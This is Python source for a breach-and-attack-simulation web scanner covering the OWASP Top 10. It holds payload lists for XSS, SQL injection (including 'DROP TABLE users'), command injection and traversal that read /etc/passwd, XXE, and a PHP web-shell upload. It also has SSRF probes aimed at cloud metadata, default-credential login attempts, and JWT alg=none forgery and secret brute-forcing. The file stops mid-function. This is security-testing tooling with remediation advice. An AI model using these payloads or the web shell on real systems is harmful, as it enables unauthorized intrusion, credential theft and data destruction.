"""
OWASP Web Attacks Module - v2.0 COMPREHENSIVE EDITION
MITRE ATT&CK: T1190 - Exploit Public-Facing Application

Full OWASP Top 10 v2021 coverage:
  A01 - Broken Access Control     : IDOR, BOLA, privilege escalation, path bypass
  A02 - Cryptographic Failures    : TLS check, weak JWT secret, sensitive data in JWT
  A03 - Injection                 : XSS, SQLi (incl. SQLite/Sequelize), CMD, SSTI, XXE, Path Traversal
  A04 - Insecure Design           : Mass assignment, business-logic flaws
  A05 - Security Misconfiguration : Missing headers, admin panel exposure, verbose errors
  A06 - Vulnerable Components     : Version disclosure, known sensitive paths, metrics exposure
  A07 - Auth Failures             : Weak/default credentials, JWT alg=none, no account lockout
  A08 - Software Integrity        : Malicious file upload (PHP, SVG), integrity bypass
  A09 - Logging Failures          : Sensitive data exposure via error pages, log endpoints
  A10 - SSRF                      : Internal URL fetching via user-controlled parameters

Key improvements over v1:
  - Static asset filter: .js/.css/.png files are SKIPPED for injection tests (fixes false positives)
  - XSS: Content-Type gating — JSON/JS responses never flagged as XSS
  - CMD: Requires regex pattern uid=\\d+\\( — not bare "uid=" substring match
  - SQLi: Extended patterns for SQLite, Sequelize, Node.js ORMs
  - Authenticated scan: Attempts login first, uses session token for all subsequent probes
  - JWT attacks: alg=none, weak secret brute-force, sensitive payload data check
  - IDOR/BOLA: Tests cross-object access with and without auth
  - Mass assignment: Attempts admin privilege escalation via registration body
  - NoSQL injection: MongoDB operator injection on login endpoints
  - SSTI: Template expression evaluation across Jinja2, EL, ERB, Twig payloads
  - Sensitive paths: /ftp, /.env, /.git, /administration, /metrics, /swagger, etc.
  - Robots.txt: Extracts and flags disallowed paths
"""

import asyncio
import base64
import json
import logging
import random
import re
import string
import time
from typing import Dict, List, Optional, Set
from urllib.parse import urlencode, urljoin, urlparse, parse_qs

import aiohttp

from bas_engine.attack_modules.base import BaseAttackModule
from bas_engine.attack_modules.utils.endpoint_discovery import EndpointDiscoveryEngine
from bas_engine.models.simulation import Finding, Severity

logger = logging.getLogger("secureforge.module.owasp_web.v2")


# ── Static asset filter ───────────────────────────────────────────────────────

STATIC_EXTENSIONS = (
    ".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg",
    ".ico", ".woff", ".woff2", ".ttf", ".eot", ".map",
    ".webp", ".pdf", ".zip", ".gz", ".tar",
)


def _is_static_asset(url: str) -> bool:
    """Return True when the URL path ends with a known static-asset extension."""
    path = urlparse(url).path.lower()
    return path.endswith(STATIC_EXTENSIONS)


def _is_internal_url(url: str) -> bool:
    """Return True when the URL resolves to a private / link-local / metadata IP."""
    import ipaddress
    try:
        host = urlparse(url).hostname or ""
        if host in ("localhost", "ip6-localhost", "ip6-loopback"):
            return True
        if host.endswith(".internal") or host.endswith(".local"):
            return True
        if host in ("169.254.169.254", "metadata.google.internal"):
            return True
        addr = ipaddress.ip_address(host)
        return addr.is_private or addr.is_loopback or addr.is_link_local
    except Exception:
        return False


# ── JWT helpers ───────────────────────────────────────────────────────────────

def _jwt_none_attack(token: str) -> Optional[str]:
    """Return a modified JWT with alg=none and the signature stripped."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        padded = parts[0] + "===="
        header = json.loads(base64.urlsafe_b64decode(padded.encode()[:len(padded) - len(padded) % 4 or len(padded)]))
        header["alg"] = "none"
        new_hdr = base64.urlsafe_b64encode(
            json.dumps(header, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()
        return f"{new_hdr}.{parts[1]}."
    except Exception:
        return None


def _jwt_decode_payload(token: str) -> Optional[dict]:
    """Base64-decode the JWT payload without verifying the signature."""
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return None
        padded = parts[1] + "===="
        return json.loads(base64.urlsafe_b64decode(padded.encode()))
    except Exception:
        return None


def _add_unique(target_list: list, new_items: list, seen_keys: set) -> None:
    """Append findings to target_list, deduplicating by (title, evidence_prefix)."""
    for f in new_items:
        ev_key = (f.evidence or "")[:120]
        key = (f.title, ev_key)
        if key not in seen_keys:
            seen_keys.add(key)
            target_list.append(f)


# ── Payload library ───────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "'\"<script>alert(document.cookie)</script>",
    "<iframe src=javascript:alert(1)>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "SLEEP(5)",
    "pg_sleep(5)",
    "WAITFOR DELAY '0:0:5'",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
]

# Comprehensive error patterns: MySQL, PostgreSQL, SQLite, MSSQL, Oracle, Sequelize
SQLI_ERROR_PATTERNS = [
    r"sql syntax", r"mysql_fetch", r"ORA-\d{5}", r"Microsoft OLE DB",
    r"ODBC.*Error", r"SQLiteException", r"pg_query\(\)",
    r"Unclosed quotation mark", r"Warning: mysql",
    r"You have an error in your SQL syntax", r"\[SQL Server\]",
    r"PostgreSQL.*ERROR", r"SQLSTATE",
    # SQLite / Node Sequelize (Juice Shop / DVWA Node variants)
    r"SQLITE_ERROR", r"SQLITE_CONSTRAINT", r"no such table",
    r"SequelizeDatabaseError", r"SequelizeUniqueConstraintError",
    r"near \".*?\": syntax error", r"unrecognized token",
    r"SqliteError", r"sqlite3_step",
    r"knex.*error", r"typeorm.*query.*failed",
]

CMD_INJECTION_PAYLOADS = [
    "; ls", "| ls", "`ls`", "$(ls)",
    "; whoami", "$(whoami)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "& dir",
    "| dir",
]

# Require a proper uid=<num>(<name>) pattern — NOT just "uid=" in JS source
CMD_EXEC_PATTERN = re.compile(r"uid=\d+\(|root:x:0:0|www-data|daemon:x:")

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "../../../../windows/win.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\windows\\win.ini",
]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),           # Jinja2 / Twig
    ("${7*7}", "49"),            # FreeMarker / Spring EL
    ("<%= 7*7 %>", "49"),        # ERB (Ruby)
    ("#{7*7}", "49"),            # Ruby string interpolation
    ("*{7*7}", "49"),            # Thymeleaf
    ("{{7*'7'}}", "7777777"),    # Jinja2 string multiplication
]

NOSQL_PAYLOADS = [
    {"email": {"$gt": ""}, "password": {"$gt": ""}},
    {"email": {"$ne": "invalid@x.invalid"}, "password": {"$ne": "invalid"}},
    {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}},
]

OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "///evil.com",
    "https:////evil.com",
]

FILE_UPLOAD_PAYLOADS = [
    ("shell.php",   "<?php system($_GET['cmd']); ?>",                                      "application/x-php"),
    ("shell.php5",  "<?php system($_GET['cmd']); ?>",                                      "application/x-php"),
    ("shell.phtml", "<?php echo 'pwned'; ?>",                                              "application/x-php"),
    ("shell.svg",   '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', "image/svg+xml"),
]

HEADER_INJECTION_PAYLOADS = {
    "User-Agent":       "<script>alert(1)</script>",
    "Referer":          "javascript:alert(1)",
    "X-Forwarded-For":  "127.0.0.1",
    "X-Forwarded-Host": "evil.com",
    "X-Real-IP":        "169.254.169.254",
}

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    "http://ssrf-canary.secureforge.internal/test",
]

PROBE_PARAMS   = ["q", "id", "search", "user", "page", "file", "path", "input", "query", "name"]
REDIRECT_PARAMS = ["redirect", "url", "next", "return", "return_to", "goto", "redir"]
SSRF_PARAMS    = ["url", "uri", "dest", "target", "page", "file", "path"]

# Known weak / default credentials to try
DEFAULT_CREDENTIALS = [
    ("admin@juice-sh.op",  "admin123"),
    ("admin",              "admin"),
    ("admin",              "admin123"),
    ("admin",              "password"),
    ("administrator",      "administrator"),
    ("test@test.com",      "test"),
]

# Weak JWT secrets to brute-force
WEAK_JWT_SECRETS = [
    "secret", "password", "jwt_secret", "supersecret",
    "your-256-bit-secret", "", "changeme", "token",
]

# Sensitive paths to actively probe regardless of crawl
SENSITIVE_PATHS = [
    "/ftp/", "/ftp",
    "/.git/HEAD", "/.env",
    "/robots.txt", "/sitemap.xml",
    "/administration", "/admin",
    "/api-docs", "/swagger.json", "/openapi.json",
    "/.well-known/",
    "/backup", "/config",
    "/server-status", "/phpinfo.php",
    "/actuator", "/actuator/env", "/actuator/health",
    "/metrics",
    "/encryptionkeys/",
    "/support/logs",
    "/rest/admin/application-version",
    "/rest/admin/application-configuration",
    "/rest/products/search",
    "/api/Users",
    "/api/Users/1",
    "/api/Users/2",
    "/rest/user/whoami",
    "/rest/basket/1",
    "/rest/basket/2",
    "/api/Challenges",
    "/api/Quantitys/1",
    "/profile",
]


class OWASPWebModule(BaseAttackModule):
    MODULE_NAME  = "owasp_web"
    DESCRIPTION  = "OWASP Top 10 v2021 full-coverage scanner (A01-A10) with authenticated session"
    MITRE_TACTIC = "Initial Access"
    MITRE_IDS    = [
        "T1190",     # Exploit Public-Facing Application
        "T1059.007", # JavaScript execution (XSS)
        "T1083",     # File and Directory Discovery (path traversal)
        "T1592",     # Gather Victim Host Info (fingerprinting)
        "T1557",     # Adversary-in-the-Middle (no TLS)
        "T1203",     # Exploitation for Client Execution (CMD)
        "T1078",     # Valid Accounts (auth bypass)
        "T1110",     # Brute Force (credential testing)
        "T1087",     # Account Discovery (IDOR)
        "T1548",     # Abuse Elevation Control (mass assignment)
    ]

    # ─────────────────────────────────────────────────────────────────────────
    # Main entry point
    # ─────────────────────────────────────────────────────────────────────────

    async def execute(self) -> List[Finding]:
        findings: List[Finding] = []
        seen_keys: Set[tuple] = set()

        resolved = await self.resolve_target()
        target   = self.build_target_url(resolved, default_scheme="http")

        # ── Options ────────────────────────────────────────────────────────
        max_depth        = self.options.get("max_depth",        2)
        max_urls         = self.options.get("max_urls",         60)
        max_concurrency  = self.options.get("max_concurrency",  10)
        time_budget_s    = self.options.get("time_budget_s",    180)
        request_timeout  = self.options.get("request_timeout_s", 8)
        test_file_upload = self.options.get("test_file_upload", True)
        test_xxe         = self.options.get("test_xxe",         True)
        test_ssrf        = self.options.get("test_ssrf",        True)
        test_redirect    = self.options.get("test_open_redirect", True)
        test_headers_inj = self.options.get("test_headers",     True)
        test_auth        = self.options.get("test_auth",        True)
        test_idor        = self.options.get("test_idor",        True)
        test_ssti        = self.options.get("test_ssti",        True)

        deadline = time.monotonic() + time_budget_s
        sem      = asyncio.Semaphore(max_concurrency)

        def time_left() -> bool:
            return time.monotonic() < deadline

        timeout   = aiohttp.ClientTimeout(
            total=request_timeout, connect=5, sock_connect=5, sock_read=request_timeout
        )
        connector = aiohttp.TCPConnector(ssl=False, limit=max_concurrency)

        auth_token:   Optional[str]        = None
        auth_headers: Dict[str, str]       = {}

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"User-Agent": "SecureForge-BAS/2.0 (authorized security testing)"},
        ) as session:

            # ── Step 0: Baseline reachability ────────────────────────────
            baseline = await self._get(session, sem, target)
            if baseline is None:
                findings.append(self.finding(
                    title="Target Unreachable",
                    description=f"Could not connect to {target}.",
                    severity=Severity.INFO,
                ))
                return findings

            status, resp_headers, body = baseline

            # ── Step 1: A02 / A05 — Header analysis ─────────────────────
            hdr_findings = await self._check_headers(target, resp_headers)
            findings.extend(hdr_findings)

            # ── Step 2: A07 — Authentication testing ─────────────────────
            if test_auth:
                auth_result = await self._test_authentication(session, sem, target)
                _add_unique(findings, auth_result["findings"], seen_keys)
                auth_token = auth_result.get("token")
                if auth_token:
                    auth_headers = {"Authorization": f"Bearer {auth_token}"}
                    await self.emit_event(
                        "INFO",
                        "[A07] Authenticated — proceeding with full authenticated scan",
                    )

            # ── Step 3: A07 / A02 — JWT attacks ─────────────────────────
            if auth_token and test_auth and time_left():
                jwt_findings = await self._test_jwt_attacks(
                    session, sem, target, auth_token
                )
                _add_unique(findings, jwt_findings, seen_keys)

            # ── Step 4: Crawl ─────────────────────────────────────────────
            self.logger.info(f"[owasp_web v2] Crawling {target}")
            crawl_budget   = max(5.0, deadline - time.monotonic())
            engine         = EndpointDiscoveryEngine(
                session, target,
                max_endpoints=max_urls, max_depth=max_depth,
                timeout=request_timeout, max_concurrency=max_concurrency,
                time_budget_s=crawl_budget,
            )
            discovered_urls = await engine.discover()
            if target not in discovered_urls:
                discovered_urls.insert(0, target)

            # Inject known sensitive paths and app-specific routes
            for extra in SENSITIVE_PATHS:
                extra_url = urljoin(target, extra)
                if extra_url not in discovered_urls:
                    discovered_urls.append(extra_url)

            discovered_urls = discovered_urls[:max_urls]
            self.logger.info(f"[owasp_web v2] Probing {len(discovered_urls)} endpoints")
            await self.emit_event(
                "INFO",
                f"[CRAWL] {len(discovered_urls)} endpoints queued on {target}",
            )

            # ── Step 5: A01 / A05 / A06 — Sensitive path probing ─────────
            if time_left():
                sp_findings = await self._test_sensitive_paths(
                    session, sem, target, auth_headers
                )
                _add_unique(findings, sp_findings, seen_keys)

            # ── Step 6: One-time structural probes ────────────────────────
            one_time: list = []
            if test_file_upload and time_left():
                one_time.append(
                    self._test_file_upload_once(session, sem, target, auth_headers)
                )
            if test_xxe and time_left():
                one_time.append(
                    self._test_xxe_once(session, sem, target, auth_headers)
                )
            if test_auth and test_idor and auth_token and time_left():
                one_time.append(self._test_idor(session, sem, target, auth_token))
                one_time.append(
                    self._test_mass_assignment(session, sem, target, auth_headers)
                )
            if test_auth and time_left():
                one_time.append(
                    self._test_nosql_injection(session, sem, target)
                )

            if one_time:
                ot_results = await asyncio.gather(*one_time, return_exceptions=True)
                for r in ot_results:
                    if isinstance(r, list):
                        _add_unique(findings, r, seen_keys)

            # ── Step 7: Per-endpoint analysis ─────────────────────────────
            async def analyze_one(url: str) -> List[Finding]:
                local: List[Finding] = []
                if not time_left():
                    return local

                is_static = _is_static_asset(url)
                await self.emit_event(
                    "INFO",
                    f"[OWASP] {'[skip-static] ' if is_static else ''}Analyzing: {url}",
                )

                if is_static:
                    return local  # no injection tests on JS/CSS bundles

                parsed = urlparse(url)
                query  = parse_qs(parsed.query)

                sub: list = []
                if query:
                    for param in query:
                        sub.append(
                            self._test_param_injection(
                                session, sem, url, param, auth_headers
                            )
                        )
                    if test_redirect and any(p in query for p in REDIRECT_PARAMS):
                        sub.append(
                            self._test_open_redirect(session, sem, url, query)
                        )
                    if test_ssrf and any(p in query for p in SSRF_PARAMS):
                        sub.append(
                            self._test_ssrf(session, sem, url, query, auth_headers)
                        )
                else:
                    for probe in PROBE_PARAMS[:5]:
                        sub.append(
                            self._test_param_injection(
                                session, sem, url, probe, auth_headers
                            )
                        )
                    synthetic = {p: ["PROBE"] for p in PROBE_PARAMS[:5]}
                    if test_redirect:
                        sub.append(
                            self._test_open_redirect(session, sem, url, synthetic)
                        )
                    if test_ssrf:
                        sub.append(
                            self._test_ssrf(session, sem, url, synthetic, auth_headers)
                        )

                sub.append(
                    self._test_path_traversal_path(session, sem, url, auth_headers)
                )
                sub.append(self._test_forms(session, sem, url, auth_headers))
                if test_ssti:
                    sub.append(self._test_ssti(session, sem, url, auth_headers))
                if test_headers_inj:
                    sub.append(self._test_header_injection(session, sem, url))

                results = await asyncio.gather(*sub, return_exceptions=True)
                for r in results:
                    if isinstance(r, list):
                        local.extend(r)
                return local

            tasks = [asyncio.create_task(analyze_one(u)) for u in discovered_urls]
            while tasks:
                if not time_left():
                    self.logger.warning("[owasp_web v2] Time budget exhausted — cancelling remaining tasks")
                    for t in tasks:
                        if not t.done():
                            t.cancel()
                    await asyncio.gather(*tasks, return_exceptions=True)
                    break
                done, pending = await asyncio.wait(
                    tasks, timeout=2.0, return_when=asyncio.FIRST_COMPLETED
                )
                for t in done:
                    try:
                        _add_unique(findings, await t, seen_keys)
                    except Exception as exc:
                        self.logger.debug(f"[owasp_web v2] task error: {exc}")
                tasks = list(pending)

        if not findings:
            findings.append(self.finding(
                title="No Vulnerabilities Detected",
                description=f"Completed full OWASP Top 10 scan of {len(discovered_urls)} endpoints.",
                severity=Severity.INFO,
                mitre_id="T1190",
                evidence=f"Scan target: {target}",
            ))

        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # A07 — Authentication Failures
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_authentication(self, session, sem, target: str) -> dict:
        """Try default credentials; check for missing account lockout."""
        findings: List[Finding] = []
        result: dict = {"findings": findings, "token": None}
        login_url = urljoin(target, "/rest/user/login")

        # 1. Default / weak credentials
        for email, password in DEFAULT_CREDENTIALS:
            async with sem:
                try:
                    async with session.post(
                        login_url,
                        json={"email": email, "password": password},
                        headers={"Content-Type": "application/json"},
                        allow_redirects=False,
                    ) as resp:
                        if resp.status in (200, 201):
                            body = await resp.json(content_type=None)
                            token = (
                                body.get("authentication", {}).get("token")
                                or body.get("token")
                            )
                            if token:
                                findings.append(self.finding(
                                    title="Default / Weak Credentials Accepted (A07)",
                                    description=(
                                        f"Login succeeded with email='{email}' password='{password}'. "
                                        "Default credentials are an OWASP A07 critical failure."
                                    ),
                                    severity=Severity.CRITICAL,
                                    mitre_id="T1078",
                                    evidence=f"POST {login_url} → HTTP {resp.status} | creds: {email}:{password}",
                                    remediation=(
                                        "Enforce strong password policy. Disable all default accounts. "
                                        "Implement MFA."
                                    ),
                                ))
                                result["token"] = token
                                return result
                except Exception:
                    pass

        # 2. No account lockout / rate limiting
        try:
            locked = False
            for _ in range(6):
                async with sem:
                    async with session.post(
                        login_url,
                        json={"email": "probe@test.invalid", "password": "wrongpassword"},
                        headers={"Content-Type": "application/json"},
                        timeout=aiohttp.ClientTimeout(total=4),
                        allow_redirects=False,
                    ) as resp:
                        if resp.status in (429, 423, 403):
                            locked = True
                            break
            if not locked:
                findings.append(self.finding(
                    title="No Account Lockout / Rate Limiting on Login (A07)",
                    description=(
                        "Login endpoint accepted 6+ consecutive failed attempts with no lockout "
                        "or rate-limit (no HTTP 429/423 received). Brute-force attacks are not mitigated."
                    ),
                    severity=Severity.HIGH,
                    mitre_id="T1110",
                    evidence=f"6 failed POST requests to {login_url} — all returned non-429 status.",
                    remediation=(
                        "Implement exponential back-off and account lockout after N failures. "
                        "Add CAPTCHA. Rate-limit by IP."
                    ),
                ))
        except Exception:
            pass

        return result

    # ─────────────────────────────────────────────────────────────────────────
    # A07 / A02 — JWT Attacks
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_jwt_attacks(
        self, session, sem, target: str, token: str
    ) -> List[Finding]:
        findings: List[Finding] = []
        whoami_url = urljoin(target, "/rest/user/whoami")

        # Attack 1: alg=none — unsigned token accepted?
        none_token = _jwt_none_attack(token)
        if none_token:
            async with sem:
                try:
                    async with session.get(
                        whoami_url,
                        headers={"Authorization": f"Bearer {none_token}"},
                        allow_redirects=False,
                    ) as resp:
                        body = await resp.text(errors="replace")
                        if resp.status == 200 and ("email" in body or "\"id\"" in body):
                            findings.append(self.finding(
                                title="JWT 'None' Algorithm Attack — Auth Bypass (A02/A07)",
                                description=(
                                    "Server accepted a JWT with algorithm='none' and no signature. "
                                    "An attacker can forge arbitrary tokens and impersonate any user."
                                ),
                                severity=Severity.CRITICAL,
                                mitre_id="T1078",
                                evidence=(
                                    f"GET {whoami_url} with alg=none JWT "
                                    f"→ HTTP {resp.status}. Response: {body[:200]}"
                                ),
                                remediation=(
                                    "Explicitly whitelist allowed algorithms (RS256 or HS256 only). "
                                    "Reject tokens with alg=none unconditionally."
                                ),
                            ))
                except Exception:
                    pass

        # Attack 2: Sensitive data inside JWT payload
        payload = _jwt_decode_payload(token)
        if payload:
            sensitive = [
                k for k in payload
                if k.lower() in ("password", "secret", "key", "isadmin", "role", "admin")
            ]
            if sensitive:
                findings.append(self.finding(
                    title="Sensitive Fields in JWT Payload (A02)",
                    description=(
                        f"JWT payload contains sensitive fields: {sensitive}. "
                        "JWT payloads are base64-encoded (NOT encrypted) — any party with the token can read them."
                    ),
                    severity=Severity.HIGH,
                    mitre_id="T1552",
                    evidence=f"JWT payload keys: {list(payload.keys())}",
                    remediation=(
                        "Never store sensitive data in JWT payload. "
                        "Use opaque session references for role/privilege data."
                    ),
                ))

        # Attack 3: Weak JWT secret
        try:
            import jwt as pyjwt
            for secret in WEAK_JWT_SECRETS:
                try:
                    pyjwt.decode(token, secret, algorithms=["HS256"])
                    findings.append(self.finding(
                        title="JWT Signed with Weak / Guessable Secret (A02)",
                        description=(
                            f"JWT was successfully verified with the trivially guessable secret '{secret}'. "
                            "An attacker can forge tokens with arbitrary claims."
                        ),
                        severity=Severity.CRITICAL,
                        mitre_id="T1078",
                        evidence=f"pyjwt.decode(token, '{secret}', algorithms=['HS256']) succeeded.",
                        remediation=(
                            "Use a cryptographically random ≥256-bit secret. "
                            "Rotate secrets regularly. Consider RS256 with key pair."
                        ),
                    ))
                    break
                except Exception:
                    pass
        except ImportError:
            pass

        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # A01 — IDOR / BOLA
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_idor(
        self, session, sem, target: str, auth_token: str
    ) -> List[Finding]:
        findings: List[Finding] = []
        auth_hdr = {"Authorization": f"Bearer {auth_token}"}

        idor_targets = [
            ("/api/Users/1",   "User object #1"),
            ("/api/Users/2",   "User object #2"),
            ("/rest/basket/1", "Shopping basket #1"),
            ("/rest/basket/2", "Shopping basket #2"),
        ]

        for path, label in idor_targets:
            url = urljoin(target, path)
            async with sem:
                try:
                    # Without auth first
                    async with session.get(url, allow_redirects=False) as r_noauth:
                        body_noauth = await r_noauth.text(errors="replace")
                        noauth_data = (
                            r_noauth.status == 200
                            and any(k in body_noauth for k in ('"email"', '"username"', '"password"', '"id"'))
                        )
                        if noauth_data:
                            findings.append(self.finding(
                                title=f"Broken Object Level Authorization — {label} (A01)",
                                description=(
                                    f"Resource {path} is accessible WITHOUT authentication "
                                    "and returns user/sensitive data."
                                ),
                                severity=Severity.CRITICAL,
                                mitre_id="T1087",
                                evidence=(
                                    f"GET {url} (no auth) → HTTP {r_noauth.status}. "
                                    f"Body: {body_noauth[:200]}"
                                ),
                                remediation=(
                                    "Enforce authentication AND object-level authorization on every request. "
                                    "Verify the caller owns the requested resource."
                                ),
                            ))
                            continue

                    # With auth — check cross-user access
                    async with session.get(url, headers=auth_hdr, allow_redirects=False) as r_auth:
                        body_auth = await r_auth.text(errors="replace")
                        if r_auth.status == 200 and any(
                            k in body_auth for k in ('"email"', '"username"', '"id"')
                        ):
                            findings.append(self.finding(
                                title=f"Insecure Direct Object Reference — {label} (A01)",
                                description=(
                                    f"Authenticated user can access {path}. "
                                    "Verify if cross-user (horizontal) access is possible."
                                ),
                                severity=Severity.HIGH,
                                mitre_id="T1087",
                                evidence=(
                                    f"GET {url} (authenticated) → HTTP {r_auth.status}. "
                                    f"Body preview: {body_auth[:200]}"
                                ),
                                remediation=(
                                    "Tie every object lookup to the authenticated user's identity. "
                                    "Use UUIDs instead of sequential IDs."
                                ),
                            ))
                except Exception:
                    pass

        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # A04 — Mass Assignment
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_mass_assignment(
        self, session, sem, target: str, auth_headers: dict
    ) -> List[Finding]:
        findings: List[Finding] = []
        register_url = urljoin(target, "/api/Users/")
        rand_email   = (
            "probe_"
            + "".join(random.choices(string.ascii_lowercase, k=6))
            + "@test.invalid"
        )
        payload = {
            "email":          rand_email,
            "password":       "Test1234!",
            "passwordRepeat": "Test1234!",
            "securityQuestion": {"id": 1, "question": "What is your pet's name?"},
            "securityAnswer": "probe",
            "isAdmin": True,
            "role":    "admin",
        }
        async with sem:
            try:
                async with session.post(
                    register_url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    allow_redirects=False,
                ) as resp:
                    if resp.status in (200, 201):
                        body = await resp.text(errors="replace")
                        body_json = json.loads(body) if body.strip().startswith("{") else {}
                        created   = body_json.get("data", body_json)
                        if created.get("isAdmin") is True or created.get("role") == "admin":
                            findings.append(self.finding(
                                title="Mass Assignment — Admin Privilege Escalation (A04)",
                                description=(
                                    "Registration endpoint accepted 'isAdmin: true' and created "
                                    "an administrator account. Mass assignment allows privilege escalation."
                                ),
                                severity=Severity.CRITICAL,
                                mitre_id="T1548",
                                evidence=(
                                    f"POST {register_url} with isAdmin:true "
                                    f"→ HTTP {resp.status}. isAdmin={created.get('isAdmin')}"
                                ),
                                remediation=(
                                    "Use strict field allowlists (DTO pattern) — never bind raw request "
                                    "body directly to your data model. Strip privileged fields on input."
                                ),
                            ))
            except Exception:
                pass
        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # A03 — NoSQL Injection
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_nosql_injection(self, session, sem, target: str) -> List[Finding]:
        findings: List[Finding] = []
        login_url = urljoin(target, "/rest/user/login")

        for payload in NOSQL_PAYLOADS:
            async with sem:
                try:
                    async with session.post(
                        login_url,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                        allow_redirects=False,
                    ) as resp:
                        if resp.status in (200, 201):
                            body = await resp.text(errors="replace")
                            if "token" in body:
                                findings.append(self.finding(
                                    title="NoSQL Injection — Authentication Bypass (A03)",
                                    description=(
                                        "Login endpoint is vulnerable to MongoDB operator injection. "
                                        "Authentication bypassed using $gt / $ne / $regex operators."
                                    ),
                                    severity=Severity.CRITICAL,
                                    mitre_id="T1190",
                                    evidence=(
                                        f"POST {login_url} payload={json.dumps(payload)[:120]} "
                                        f"→ HTTP {resp.status} — auth token in response."
                                    ),
                                    remediation=(
                                        "Validate that login fields are plain strings before query execution. "
                                        "Reject object/operator values. Use parameterized queries."
                                    ),
                                ))
                                break
                except Exception:
                    pass

        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # A03 — SSTI
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_ssti(
        self, session, sem, url: str, auth_headers: dict
    ) -> List[Finding]:
        findings: List[Finding] = []
        if _is_static_asset(url):
            return findings
        base_url = url.split("?")[0]

        for probe_param in PROBE_PARAMS[:3]:
            for payload, expected in SSTI_PAYLOADS:
                test_url = f"{base_url}?{probe_param}={payload}"
                resp = await self._get(session, sem, test_url, auth_headers=auth_headers)
                if resp:
                    body = resp[2]
                    if expected in body and payload not in body:
                        findings.append(self.finding(
                            title=f"Server-Side Template Injection in '{probe_param}' (A03)",
                            description=(
                                f"Template expression '{payload}' was evaluated server-side "
                                f"and returned '{expected}'. SSTI can lead to Remote Code Execution."
                            ),
                            severity=Severity.CRITICAL,
                            mitre_id="T1059",
                            evidence=(
                                f"GET {test_url} → payload evaluated to '{expected}'"
                            ),
                            remediation=(
                                "Never pass user input to template engines. "
                                "Use sandboxed template environments. Treat all template input as untrusted."
                            ),
                        ))
                        return findings  # one confirmed SSTI is sufficient
        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # A01 / A05 / A06 — Sensitive path probing
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_sensitive_paths(
        self, session, sem, target: str, auth_headers: dict
    ) -> List[Finding]:
        findings: List[Finding] = []

        async def probe(path: str) -> Optional[Finding]:
            url  = urljoin(target, path)
            resp = await self._get(session, sem, url, auth_headers=auth_headers)
            if not resp:
                return None
            status, headers, body = resp
            body_lower = body.lower()

            if status != 200 or len(body) < 5:
                return None

            if path in ("/ftp/", "/ftp"):
                if any(k in body_lower for k in ("acquisition", "coupon", "index of", ".md", ".bak")):
                    return self.finding(
                        title="Sensitive FTP Directory Exposed (A01)",
                        description=f"FTP directory at {url} is publicly readable — internal files exposed.",
                        severity=Severity.HIGH,
                        mitre_id="T1083",
                        evidence=f"GET {url} → HTTP {status}. Body: {body[:300]}",
                        remediation="Block web access to /ftp. Move internal files behind authentication.",
                    )
            elif path in ("/administration", "/admin"):
                return self.finding(
                    title="Admin Panel Exposed (A01)",
                    description=f"Administration panel at {url} returned HTTP 200.",
                    severity=Severity.CRITICAL,
                    mitre_id="T1078",
                    evidence=f"GET {url} → HTTP {status}",
                    remediation="Restrict admin panel to internal network/VPN. Enforce MFA.",
                )
            elif path == "/.env":
                return self.finding(
                    title="Environment File (.env) Publicly Readable (A05)",
                    description=".env file is accessible — may expose API keys, DB credentials, secrets.",
                    severity=Severity.CRITICAL,
                    mitre_id="T1552",
                    evidence=f"GET {url} → HTTP {status}. Body: {body[:200]}",
                    remediation="Never serve .env files. Add deny rules in the web server config.",
                )
            elif path == "/.git/HEAD":
                return self.finding(
                    title="Git Repository Exposed (A05)",
                    description=f".git directory accessible at {url} — full source code is recoverable.",
                    severity=Severity.CRITICAL,
                    mitre_id="T1083",
                    evidence=f"GET {url} → HTTP {status}. Content: {body[:80]}",
                    remediation="Block /.git in web server config. Never deploy with .git directory.",
                )
            elif path in ("/api-docs", "/swagger.json", "/openapi.json"):
                return self.finding(
                    title="API Documentation Publicly Exposed (A05)",
                    description=f"API docs at {url} disclose all endpoints, parameters, and schemas.",
                    severity=Severity.MEDIUM,
                    mitre_id="T1592",
                    evidence=f"GET {url} → HTTP {status}",
                    remediation="Restrict API docs to authenticated users or internal network.",
                )
